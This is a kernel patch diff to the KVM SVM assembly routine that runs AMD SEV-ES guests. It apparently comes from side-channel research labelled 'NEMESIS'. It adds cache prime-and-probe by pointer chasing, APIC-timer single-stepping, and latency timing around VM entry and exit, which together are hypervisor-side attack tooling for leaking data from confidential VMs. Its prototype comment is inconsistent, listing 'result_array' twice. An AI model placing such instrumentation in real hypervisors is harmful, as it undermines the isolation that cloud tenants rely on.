@@ -159,8 +159,14 @@ SYM_FUNC_START(__svm_vcpu_run)
 SYM_FUNC_END(__svm_vcpu_run)
 
 /**
+__svm_sev_es_vcpu_run(unsigned long vmcb_pa,void* chase,void* chase_rev,
+uint64_t* result_array,uint64_t len, uint64_t* result_array);
  * __svm_sev_es_vcpu_run - Run a SEV-ES vCPU via a transition to SVM guest mode
- * @vmcb_pa:	unsigned long
+ * @vmcb_pa:	unsigned long -> rdi
+ * our chase ptr -> rsi
+ * apic timer value. Start apic timer if != 0 -> rdx
+ * reverse chase -> rcx
+ * apic mem address to write to for starting timer -> r8
  */
 SYM_FUNC_START(__svm_sev_es_vcpu_run)
 	push %_ASM_BP
@@ -175,8 +181,44 @@ SYM_FUNC_START(__svm_sev_es_vcpu_run)
 #endif
 	push %_ASM_BX
 
+	/*save pointer to reverse chase becuase we need it again after the context switch*/
+	push %rcx
+
+	/*NEMESIS: save 6th function argument (latency variable)*/
+	push %r9
+
+	/*do prime with chase if chase ptr != null*/
+	test %rsi,%rsi
+	jz vmenter_cpu_prime_pointer_chasing_null
+	vmenter_cpu_prime_pointer_chasing:
+	mfence
+	mov (%rsi), %rsi
+	test %rsi,%rsi
+	jne vmenter_cpu_prime_pointer_chasing
+	vmenter_cpu_prime_pointer_chasing_null:
+
+	/*only start apic timer after priming the cache, otherwise timer value
+	for single stepping would depend on eviction set size*/
+	test %rdx,%rdx
+	jz vmenter_skip_apic_write
+	
+	/*start apic timer*/
+	movl %edx, (%r8)
+	vmenter_skip_apic_write:
+
+	/* NEMESIS: tsc_vm_enter */
+	lfence
+	movl $1, %ecx 	    /* RDPRU_ECX_APERF */
+	rdpru
+	/* rdmsr/rdpru returns EDX:EAX pair values
+	 sequence imposes overhead of ~3 cycles + ~15 cycles from rdi-mov + sti*/
+	shl $32, %rdx
+	or %rdx, %rax
+	lfence
+	push %rax	   /*save vm_enter on stack since rax is needed*/
+
 	/* Move @vmcb to RAX. */
-	mov %_ASM_ARG1, %_ASM_AX
+	mov %rdi, %_ASM_AX
 
 	/* Enter guest mode */
 	sti
@@ -184,6 +226,77 @@ SYM_FUNC_START(__svm_sev_es_vcpu_run)
 1:	vmrun %_ASM_AX
 
 2:	cli
+
+	/* NEMESIS: tsc_vm_exit */
+	lfence
+	movl $1, %ecx 	  /* RDPRU_ECX_APERF */
+	rdpru
+	shl $32, %rdx
+	or %rdx, %rax
+	lfence
+
+	pop %r10         /*retrieve vm_enter (push rax) timestamp from stack*/
+	pop %r9		     /*retrieve 6th func arg*/
+
+	sub %r10, %rax   /*latency = vm_exit - vm_enter*/
+	movq %rax, (%r9) /*move latency val -> arg*/
+
+
+
+	/*recover pointer chase ptr from stack*/
+	pop %rsi
+	/*check if chase ptr is null*/
+	test %rsi,%rsi 
+	/*if null jump forward to skip chasing*/
+	jz vmenter_probing_done
+	mfence
+vmenter_cpu_probe_pointer_chasing_inplace_loop:
+	mov %rsi, %rdi
+	/* perf reading*/
+	mfence
+	movl $0xc0010203, %ecx
+	rdmsr
+	shl $32, %rdx
+	or %rdx, %rax
+	mov %rax, %r8
+
+
+	lfence
+	movl $1, %ecx
+	rdpru
+	shl $32, %rdx
+	or %rdx, %rax
+	lfence
+	mov %rax, %r10
+
+
+	movq (%rdi), %rsi
+
+
+	lfence
+	movl $1, %ecx
+	rdpru
+	shl $32, %rdx
+	or %rdx, %rax
+	lfence
+
+
+	sub %r10, %rax
+	mov %rax, %r11      /*replace r9 with r11*/
+	lfence
+	movl $0xc0010203, %ecx
+	rdmsr
+	shl $32, %rdx
+	or %rdx, %rax
+	sub %r8, %rax
+	mfence
+	movq %r11, (%rdi)   /*replace r9 with r11*/
+	movq %rax, 8(%rdi)
+	test %rsi, %rsi
+	jne vmenter_cpu_probe_pointer_chasing_inplace_loop
+
+
+	vmenter_probing_done:
 
 #ifdef CONFIG_RETPOLINE
 	/* IMPORTANT: Stuff the RSB immediately after VM-Exit, before RET! */
